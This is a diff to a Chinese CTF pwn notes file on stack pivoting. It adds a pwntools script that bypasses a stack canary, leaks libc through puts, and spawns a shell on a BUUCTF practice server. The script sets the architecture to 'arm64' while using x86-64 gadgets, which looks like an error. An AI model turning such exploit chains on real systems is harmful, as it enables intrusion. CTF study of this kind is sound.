@@ -22,7 +22,7 @@ shellcode=asm(shellcraft.sh())
 print(shellcode)
 ```
 
-6. pwn rop题模板
+6. pwn 堆题模板
 
 ### 64位
 
@@ -60,6 +60,50 @@ p.interactive()
 栈迁移:[ciscn_2019_es_2](https://github.com/C0nstellati0n/NoobCTF/blob/main/CTF/BUUCTF/pwn/ciscn_2019_es_2.md)
 
 栈迁移分很多种情况。第一种情况：`偏移+栈迁移目标地址-4+leave_ret`，同时目标地址直接写ropchain。第二种情况：`偏移+栈迁移目标地址+leave_ret`，目标地址先根据程序是多少位的填充4或者8个字节，再写ropchain。第三种情况，迁移的目标地址离一些重要地址比较近，比如got表，这时候就要留出一些位置，`偏移+栈迁移目标地址-0xd0+leave_ret`，目标地址先写0xd0+4个偏移再写ropchain；或者`偏移+栈迁移目标地址+leave_ret`，但是目标地址的ropchain前面加上若干个ret，抬高栈。例题：[gyctf_2020_borrowstack](https://github.com/C0nstellati0n/NoobCTF/blob/main/CTF/BUUCTF/pwn/gyctf_2020_borrowstack.md)
+
+菜单类栈溢出题+canary绕过+ret2libc
+
+```python
+from pwn import *
+context.log_level='debug'
+context(arch='arm64')   #因为下方使用了flat，故此处一定要根据程序的位数填写，这个是64位，32位是i386。如果填写错误会导致下方的flag出错。
+p=remote('node4.buuoj.cn',27351)
+def Store(content):
+    p.recvuntil('>>')
+    p.sendline('1')
+    p.sendline(content)
+ 
+def Print():
+    p.recvuntil('>>')
+    p.sendline('2')
+ 
+def Quit():
+	p.recvuntil('>>')
+	p.sendline('3')
+puts_plt=0x00400690
+puts_got=0x00600fa8
+pop_rdi=0x0000000000400a93
+main=0x00400908
+payload=b'a'*0x88
+Store(payload)
+Print()
+p.recvuntil('a\n')
+canary=p.recv(7).rjust(8,b'\x00')
+print(canary)
+payload=flat([b'a'*0x88,canary,0,pop_rdi,puts_got,puts_plt,main])
+Store(payload)
+Quit()
+p.recv()
+puts=u64(p.recv(6).ljust(8,b'\x00'))
+puts_offset=456336
+libc_base=puts-puts_offset
+binsh=1625431+libc_base
+system=283536+libc_base
+payload=flat([b'a'*0x88,canary,0,pop_rdi,binsh,system,main])
+Store(payload)
+Quit()
+p.interactive()
+```
 
 7. pwntools得到libc偏移
 
